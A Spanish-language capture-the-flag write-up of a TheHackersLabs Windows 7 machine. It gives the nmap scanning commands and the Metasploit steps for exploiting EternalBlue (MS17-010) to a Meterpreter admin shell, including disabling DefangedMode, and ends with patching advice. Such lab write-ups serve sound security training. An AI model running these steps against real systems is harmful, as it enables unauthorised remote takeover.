# Microchoft — TheHackersLabs

| Campo        | Detalle                                                                 |
|--------------|-------------------------------------------------------------------------|
| 🏷️ Plataforma | TheHackersLabs                                                          |
| 💻 SO         | Windows 7                                                               |
| 📊 Dificultad | Principiante                                                            |
| 🔑 Técnicas   | Network Scanning, SMB Enumeration, EternalBlue (MS17-010), Metasploit  |

---

## Índice

1. [Reconocimiento](#1-reconocimiento)
2. [Enumeración](#2-enumeración)
3. [Explotación](#3-explotación)
4. [Post-Explotación y Flags](#4-post-explotación-y-flags)
5. [Conclusiones](#5-conclusiones)

---

## 1. Reconocimiento

El primer paso fue identificar nuestra interfaz de red activa y la dirección IP del atacante:

```bash
ifconfig
```

Con esa información, realizamos un escaneo ARP a la red local para descubrir los hosts activos:

```bash
sudo arp-scan -I <interfaz> --localnet
```

> 💡 Las máquinas virtuales en VirtualBox suelen tener direcciones MAC que comienzan
> por `08:00`, lo que nos ayuda a identificar rápidamente el objetivo.

Una vez identificada la IP del objetivo, procedemos a la fase de enumeración.

---

## 2. Enumeración

Realizamos un escaneo completo de puertos con detección de servicios y versiones:

```bash
sudo nmap -p- -sS -Pn -n -sC -sV -vvv -T5 <IP_OBJETIVO>
```

El escaneo reveló el puerto **445/tcp** abierto, correspondiente al servicio **SMB**.
Para profundizar en posibles vulnerabilidades sobre ese puerto, lanzamos los scripts
de vulnerabilidades de Nmap:

```bash
sudo nmap -p 445 --script=vuln <IP_OBJETIVO>
```

**Resultado clave:** el servicio SMBv1 expuesto era vulnerable a **MS17-010 (EternalBlue)**
— `CVE-2017-0143` — una vulnerabilidad crítica de ejecución remota de código que afecta
a múltiples versiones de Windows.

---

## 3. Explotación

Con la vulnerabilidad confirmada, abrimos **Metasploit Framework** y buscamos los
módulos disponibles:

```bash
search CVE-2017-0143
```

> 💡 Es recomendable priorizar los exploits con ranking `excellent` o `great`.

Seleccionamos el módulo adecuado y revisamos sus opciones:

```bash
use <nombre_del_exploit>
show options
```

Configuramos los parámetros necesarios:

```bash
set RHOSTS <IP_OBJETIVO>     # IP de la máquina víctima
set LHOST <NUESTRA_IP>       # IP del atacante (para recibir la conexión)
set RPORT 445                # Puerto objetivo
```

Ejecutamos el exploit:

```bash
run
```

**Nota:** Durante la ejecución se produjo un error relacionado con `DefangedMode`.
Se resolvió deshabilitándolo antes de volver a lanzar el exploit:

```bash
set DefangedMode false
run
```

El exploit se ejecutó con éxito, obteniendo una sesión de **Meterpreter** con
privilegios de administrador sobre el sistema objetivo.

---

## 4. Post-Explotación y Flags

Con acceso al sistema como administrador, navegamos por la estructura de directorios
hasta localizar los archivos de flags correspondientes al usuario y al administrador.

| Flag       | Estado |
|------------|--------|
| 🏁 User    | ✅     |
| 🏁 Admin   | ✅     |

---

## 5. Conclusiones

Esta máquina ilustra el riesgo que supone tener el protocolo **SMBv1 habilitado**
en sistemas Windows sin parchear. La vulnerabilidad **EternalBlue (MS17-010)** sigue
siendo relevante en entornos reales, especialmente en infraestructuras legacy.

**Lecciones clave:**
- Deshabilitar SMBv1 en todos los sistemas Windows.
- Aplicar el parche de seguridad **MS17-010** publicado por Microsoft.
- Segmentar la red para limitar el alcance de este tipo de ataques.

---

*Writeup realizado con fines educativos en un entorno controlado.*
